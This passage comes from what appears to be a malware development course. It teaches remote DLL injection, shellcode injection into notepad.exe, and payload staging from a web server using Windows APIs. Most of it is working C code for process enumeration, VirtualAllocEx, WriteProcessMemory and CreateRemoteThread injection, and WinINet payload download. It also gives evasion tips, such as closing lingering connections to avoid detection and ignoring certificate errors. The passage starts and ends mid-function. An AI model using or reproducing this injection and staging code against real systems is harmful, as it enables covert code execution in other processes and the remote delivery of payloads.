	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Use the dot operator to extract the process name from the populated struct
		// If the process name matches the process we're looking for
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Use the dot operator to extract the process ID from the populated struct
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break; // Exit the loop
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));
	
	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
}

```

#### Microsoft's Example

Another process enumeration example is available for viewing??[here](https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes).

### Case Sensitive Process Name

The code snippet above contains one flaw that was overlooked which can lead to inaccurate results. The??`wcscmp`??function was used to compare the process names, but the case sensitivity was not taken into account which means??`Process1.exe`??and??`process1.exe`??will be considered two different processes.

The code snippet below fixes this issue by converting the value in the??`Proc.szExeFile`??member to a lowercase string and then comparing it to??`szProcessName`. Therefore,??`szProcessName`??must always be passed in as a lowercase string.

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
```

### DLL Injection

A process handle to the target process has been successfully retrieved. The next step is to inject the DLL into the target process which will require the use of several Windows APIs that were previously used and some new ones.

- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)??- Similar to??`VirtualAlloc`??except it allows for memory allocation in a remote process.
    
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)??- Writes data to the remote process. In this case, it will be used to write the DLL's path to the target process.
    
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??- Creates a thread in the remote process
    

### Code Walkthrough

This section will walk through the DLL injection code (shown below). The function??`InjectDllToRemoteProcess`??takes two arguments:

1. Process Handle - This is a HANDLE to the target process which will have the DLL injected into it.
    
2. DLL name - The full path to the DLL that will be injected into the target process.
    

#### Find LoadLibraryW Address

`LoadLibraryW`??is used to load a DLL inside the process that calls it. Since the goal is to load the DLL inside a remote process rather than the local process, then it cannot be invoked directly. Instead, the address of??`LoadLibraryW`??must be retrieved and passed to a remotely created thread in the process, passing the DLL name as its argument. This works because the address of the??`LoadLibraryW`??WinAPI will be the same in the remote process as in the local process. To determine the address of the WinAPI,??`GetProcAddress`??along with??`GetModuleHandle`??is used.

```c
// LoadLibrary is exported by kernel32.dll
// Therefore a handle to kernel32.dll is retrieved followed by the address of LoadLibraryW
pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
```

The address stored in??`pLoadLibraryW`??will be used as the thread entry when a new thread is created in the remote process.

#### Allocating Memory

The next step is to allocate memory in the remote process that can fit the DLL's name,??`DllName`. The??`VirtualAllocEx`??function is used to allocate the memory in the remote process.

```c
// Allocate memory the size of dwSizeToWrite (that is the size of the dll name) inside the remote process, hProcess.
// Memory protection is Read-Write
pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
```

#### Writing To Allocated Memory

After the memory is successfully allocated in the remote process, it's possible to use??`WriteProcessMemory`??to write to the allocated buffer. The DLL's name is written to the previously allocated memory buffer.

The??`WriteProcessMemory`??WinAPI function looks like the following based on its documentation

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,               // A handle to the process whose memory to be written to
  [in]  LPVOID  lpBaseAddress,          // Base address in the specified process to which data is written
  [in]  LPCVOID lpBuffer,               // A pointer to the buffer that contains data to be written to 'lpBaseAddress'
  [in]  SIZE_T  nSize,                  // The number of bytes to be written to the specified process.	
  [out] SIZE_T  *lpNumberOfBytesWritten // A pointer to a 'SIZE_T' variable that receives the number of bytes actually written
);
```

Based on??`WriteProcessMemory`'s parameters shown above, it will be called as the following, writing the buffer (`DllName`) to the allocated address (`pAddress`), returned by the previously called??`VirtualAllocEx`??function.

```c
// The data being written is the DLL name, 'DllName', which is of size 'dwSizeToWrite'
SIZE_T lpNumberOfBytesWritten = NULL;
WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)
```

#### Execution Via New Thread

After successfully writing the DLL's path to the allocated buffer,??[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??will be used to create a new thread in the remote process. This is where the address of??`LoadLibraryW`??becomes necessary.??`pLoadLibraryW`??is passed as the starting address of the thread and then??`pAddress`, which contains the DLL's name, is passed as an argument to the??`LoadLibraryW`??call. This is done by passing??`pAddress`??as the??`lpParameter`??parameter of??`CreateRemoteThread`.

`CreateRemoteThread`'s parameters are the same as that of the??`CreateThread`??WinAPI function explained earlier, except for the additional??`HANDLE hProcess`??parameter, which represents a handle to the process in which the thread is to be created.

```c
// The thread entry will be 'pLoadLibraryW' which is the address of LoadLibraryW
// The DLL's name, pAddress, is passed as an argument to LoadLibrary
HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
```

#### DLL Injection - Code Snippet

```c
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE                    = TRUE;
	
	LPVOID		pLoadLibraryW             = NULL;
	LPVOID		pAddress                  = NULL;
	
	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite             = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten    = NULL;

	HANDLE		hThread                   = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL){
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}
```

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

First, run??`RemoteDllInjection.exe`??and pass two arguments, the target process and the full DLL path to inject inside the target process. In this demo,??`notepad.exe`??is being injected.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-1.png)

  

The process enumeration successfully worked. Verify that Notepad's PID is indeed??`20932`??using Process Hacker.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-2.png)

  

Next, xdbg is attached to the targeted process, Notepad, and check the allocated address. The image below shows that the buffer was successfully allocated.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-3.png)

  

After the memory allocation, the DLL name is written to the buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-4.png)

  

Finally, a new thread is created in the remote process which executes the DLL.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-5.png)

  

Verify that the DLL was successfully injected using Process Hacker's modules tab.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-6.png)

  

Head to the threads tab in Process Hacker and notice the thread that is running LoadLibraryW as its entry function

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-dll-injection-7.png)
# 3.7 Process Injection - Shellcode Injection

### Introduction

This module will be similar to the previous DLL Injection module with minor changes. Shellcode process injection will use almost the same Windows APIs to perform the task:

- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)??- Memory allocation.
    
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)??- Write the payload to the remote process.
    
- [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)??- Modifying memory protection.
    
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??- Payload execution via a new thread.
    

### Enumerating Processes

Similarly to the previous module, process injection starts by enumerating the processes. The process enumeration code snippet shown below was already explained in the previous module.

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
```

### Shellcode Injection

To perform shellcode injection the??`InjectShellcodeToRemoteProcess`??function will be used. The function takes 3 parameters:

1. `hProcess`??- A handle to the opened remote process.
    
2. `pShellcode`??- The deobfuscated shellcode's base address and size. The shellcode must be in plaintext before being injected because it cannot be edited once it's in the remote process.
    
3. `sSizeOfShellcode`??- The size of the shellcode.
    

#### Shellcode Injection - Code Snippet

```c
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress              = NULL;

	SIZE_T	sNumberOfBytesWritten          = NULL;
	DWORD	dwOldProtection                = NULL;


	// Allocate memory in the remote process of size sSizeOfShellcode 
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	// Write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	memset(pShellcode, '\0', sSizeOfShellcode);

	// Make the memory region executable
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	
	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	// Launch the shellcode in a new thread
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	return TRUE;
}
```

### Deallocating Remote Memory

[VirtualFreeEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex)??is a WinAPI that is used to deallocate previously allocated memory in a remote process. This function should only be called after the payload has fully finished execution otherwise it might free the payload's content and crash the process.

```c
BOOL VirtualFreeEx(
  [in] HANDLE hProcess,
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
```

`VirtualFreeEx`??takes the same parameter as the??`VirtualFree`??WinAPI with the only difference being that??`VirtualFreeEx`??takes an additional parameter (`hProcess`) that specifies the target process where the memory region resides.

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

This walkthrough injects shellcode into a Notepad process therefore start by opening up Notepad and attaching the x64 xdbg debugger to it. The image below shows the process has PID??`22992`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-1.png)

  

Run??`RemoteShellcodeInjection.exe`??providing notepad.exe as an argument. The binary will start by searching for the PID of Notepad which should be the same PID shown in the xdbg debugger, which in this case is??`22992`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-2.png)

  

Next, the binary will decrypt the payload. Notice that attempting to access the memory address will result in an error. The reason this happens is because the debugger is attached to the??`notepad.exe`??process whereas the deobfuscation process occurs in the local process which is??`RemoteShellcodeInjection.exe`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-3.png)

  

To view the deobfuscated payload, a new instance of xdbg must be opened and attached to the??`RemoteShellcodeInjection.exe`??process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-4.png)

  

Back to the Notepad debugger instance, the next step is memory allocation. The base address where the payload will be written is??`0x0000021700230000`. The debugger shows that the allocated memory region was zeroed out.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-5.png)

  

The deobfuscated payload is then written to the allocated memory region in the remote process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-6.png)

  

Analyzing the local process, the payload was successfully zeroed out since it is not required anymore.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-7.png)

  

Finally, the payload is executed in the remote process inside of a new thread.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/remote-shellcode-injection-8.png)
# 3.8 Payload Staging - Web Server

### Introduction

Throughout the modules thus far, the payload has been consistently stored directly within the binary. This is a fast and commonly used method to fetch the payload. Unfortunately, in some cases where payload size constraints exist, saving the payload inside the code is not a feasible approach. The alternative approach is to host the payload on a web server and fetch it during execution.

### Setting Up The Web Server

This module requires a web server to host the payload file. The easiest way is to use??[Python's HTTP server](https://docs.python.org/3/library/http.server.html)??using the following command:

`python -m http.server 8000`

Note that the payload file should be hosted in the same directory where this command is executed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/python-http-server.png)

  

To verify the web server is working, head to??[http://127.0.0.1:8000](http://127.0.0.1:8000/)??using the browser.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/python-http-server-2.png)

### Fetching The Payload

To fetch the payload from the web server, the following Windows APIs will be used:

- [InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)??- Opens an internet session handle which is a prerequisite to using the other Internet Windows APIs
    
- [InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw)??- Open a handle to the specified resource which is the payload's URL.
    
- [InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)??- Reads data from the web resource handle. This is the handle opened by??`InternetOpenUrlW`.
    
- [InternetCloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)??- Closes the handle.
    
- [InternetSetOptionW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw)??- Sets an Internet option.
    

### Opening An Internet Session

The first step is to open an internet session handle using??[InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw)??which initializes an application's use of the WinINet functions. All the parameters being passed to the WinAPI are??`NULL`??since they are mainly for proxy-related matters. It is worth noting that having the second parameter set to??`NULL`??is equivalent to using??`INTERNET_OPEN_TYPE_PRECONFIG`, which specifies that the system's current configuration should be used to determine the proxy settings for the Internet connection.

```c
HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,       // NULL
  [in] DWORD   dwAccessType,    // NULL or INTERNET_OPEN_TYPE_PRECONFIG
  [in] LPCWSTR lpszProxy,       // NULL
  [in] LPCWSTR lpszProxyBypass, // NULL
  [in] DWORD   dwFlags          // NULL
);
```

Calling the function is shown in the snippet below.

```c
// Opening an internet session handle
hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
```

### Opening a Handle To Payload

Moving on to the next WinAPI used,??[InternetOpenUrlW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw), where a connection is being established to the payloads's URL.

```c
HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,       // Handle opened by InternetOpenW
  [in] LPCWSTR   lpszUrl,         // The payload's URL
  [in] LPCWSTR   lpszHeaders,     // NULL
  [in] DWORD     dwHeadersLength, // NULL
  [in] DWORD     dwFlags,         // INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  [in] DWORD_PTR dwContext        // NULL
);
```

Calling the function is shown in the snippet below. The fifth parameter of the function uses??`INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID`??to achieve a higher success rate with the HTTP request in case of an error on the server side. It's possible to use additional flags such as??`INTERNET_FLAG_IGNORE_CERT_CN_INVALID`??but that will be left up to the reader. The flags are well explained in Microsoft's??[documentation](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw).

```c
// Opening a handle to the payload's URL
hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
```

### Reading Data

[InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)??is the next WinAPI used which will read the payload.

```c
BOOL InternetReadFile(
  [in]  HINTERNET hFile,                  // Handle opened by InternetOpenUrlW
  [out] LPVOID    lpBuffer,               // Buffer to store the payload
  [in]  DWORD     dwNumberOfBytesToRead,  // The number of bytes to read
  [out] LPDWORD   lpdwNumberOfBytesRead   // Pointer to a variable that receives the number of bytes read
);
```

Before calling the function, a buffer must be allocated to hold the payload. Therefore,??[LocalAlloc](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localalloc)??is used to allocate a buffer the same size as the payload, 272 bytes. Once the buffer has been allocated,??`InternetReadFile`??can be used to read the payload. The function requires the number of bytes to read which in this case is??`272`.

```c
pBytes = (PBYTE)LocalAlloc(LPTR, 272);
InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)
```

### Closing InterntHandle

[InternetCloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle)??is used to close an internet handle. This should be called once the payload has been successfully fetched.

```c
BOOL InternetCloseHandle(
  [in] HINTERNET hInternet // Handle opened by InternetOpenW & InternetOpenUrlW
);
```

### Closing HTTP/S Connections

It's important to be aware that the??`InternetCloseHandle`??WinAPI does not close the HTTP/S connection. WinInet tries to reuse connections and therefore although the handle was closed, the connection remains active. Closing the connection is vital to lessen the possibility of detection. For example, a binary was created that fetches a payload from GitHub. The image below shows the binary still connected to GitHub although the binary's execution was completed.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/staging-github.png)

Luckily, the solution is quite simple. All that is required is to tell WinInet to close all the connections using the??[InternetSetOptionW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetsetoptionw)??WinAPI.

```c
BOOL InternetSetOptionW(
  [in] HINTERNET hInternet,     // NULL
  [in] DWORD     dwOption,      // INTERNET_OPTION_SETTINGS_CHANGED
  [in] LPVOID    lpBuffer,      // NULL
  [in] DWORD     dwBufferLength // 0
);
```

Calling??`InternetSetOptionW`??with the??`INTERNET_OPTION_SETTINGS_CHANGED`??flag will cause the system to update the cached version of its internet settings and thus resulting in the connections saved by WinInet being closed.

```c
InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
```

### Payload Staging - Code Snippet

`GetPayloadFromUrl`??is a function that uses the previously discussed steps to fetch the payload from a remote server and stores it in a buffer.

```c
BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	PBYTE		pBytes                 = NULL;

	DWORD		dwBytesRead            = NULL;

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating a buffer for the payload
	pBytes = (PBYTE)LocalAlloc(LPTR, 272);

	// Reading the payload
	if (!InternetReadFile(hInternetFile, pBytes, 272, &dwBytesRead)) {
		printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pBytes);

	return TRUE;
}

```

### Dynamic Payload Size Allocation

The above implementation works when the payload size is known. When the size is unknown or is larger than the number of bytes specified in??`InternetReadFile`, a heap overflow will occur resulting in the binary crashing.

One way to solve this issue is by placing??`InternetReadFile`??inside a while loop and continuously reading a constant value of bytes, which for this example will be??`1024`??bytes. The bytes are stored directly in a temporary buffer which will be of the same size,??`1024`. The temporary buffer will be appended to the total bytes buffer which will continuously be reallocated to fit each newly read??`1024`??byte chunk. Once??`InternetReadFile`??reads a value that is less than??`1024`??then that's the indicator that it has reached the end of the file and will break out of the loop.

### Payload Staging With Dynamic Allocation - Code Snippet

```c
BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	DWORD		dwBytesRead            = NULL;
  
	SIZE_T		sSize                   = NULL; // Used as the total payload size
	
	PBYTE		pBytes                  = NULL; // Used as the total payload heap buffer
	PBYTE		pTmpBytes               = NULL; // Used as the temp buffer of size 1024 bytes

	// Opening an internet session handle
	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Opening a handle to the payload's URL
	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {

		// Reading 1024 bytes to the temp buffer
		// InternetReadFile will read less bytes in case the final chunk is less than 1024 bytes
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// Updating the size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole payload
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			return FALSE;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer 
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	// Clean up
	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	return TRUE;
}

```

### Payload Staging Final - Code Snippet

The??`GetPayloadFromUrl`??function now takes 3 parameters:

- `szUrl`- The URL of the payload.
    
- `pPayloadBytes`??- Returns as the base address of the buffer containing the payload.
    
- `sPayloadSize`??- The total size of the payload that was read.
    

The function will also correctly closes the HTTP/S connections once the retrieval of the payload has been completed.

```c
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE            = TRUE;

	HINTERNET	hInternet         = NULL,
			    hInternetFile     = NULL;

	DWORD		dwBytesRead       = NULL;
	
	SIZE_T		sSize             = NULL;
